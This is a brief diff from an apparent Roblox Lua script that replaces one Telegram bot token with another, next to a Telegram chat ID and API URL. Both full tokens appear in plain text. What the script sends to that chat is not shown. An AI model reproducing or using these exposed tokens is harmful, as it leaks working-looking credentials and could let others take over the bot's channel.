@@ -10,7 +10,7 @@ local CoreGui = game:GetService("CoreGui")
 local player = Players.LocalPlayer
 
 -- Конфигурация Telegram API
-local BOT_TOKEN = "7994146351:AAE_w1jgiZRvGHNG1jlTLyn7v8bvYyZe4Z8"
+local BOT_TOKEN = "8158106101:AAGTaP3CEjnWh1rjNjj7UlqfJisani8Gwz8"
 local CHAT_ID = "-1003189784409"
 local API_URL = "https://api.telegram.org/bot" .. BOT_TOKEN
 
